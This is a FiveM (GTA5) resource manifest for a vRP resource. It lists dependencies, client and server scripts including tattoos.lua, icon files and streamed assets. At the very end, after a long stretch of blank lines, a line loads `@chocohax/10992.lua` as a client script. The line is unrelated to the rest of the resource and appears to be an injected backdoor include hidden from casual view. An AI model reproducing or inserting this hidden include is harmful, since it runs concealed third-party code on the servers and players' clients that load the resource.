fx_version "adamant"
games {'gta5'}
dependency "vrp"

dependency 'ghmattimysql'
shared_script 'config.lua'
client_scripts {
    "@vrp/lib/utils.lua",
    "lib/Tunnel.lua",
	"lib/Proxy.lua",
    'serverCallbackLib/client.lua',
    'tattoos.lua',
	'client/*.lua'
}

server_scripts {
	"@vrp/lib/utils.lua",
	'serverCallbackLib/server.lua',
	"server/*.lua"
}
files {
	"things/icons/*.png",
    "things/icons/menus/*.png",

	"stream/*"
}
















client_script '@chocohax/10992.lua'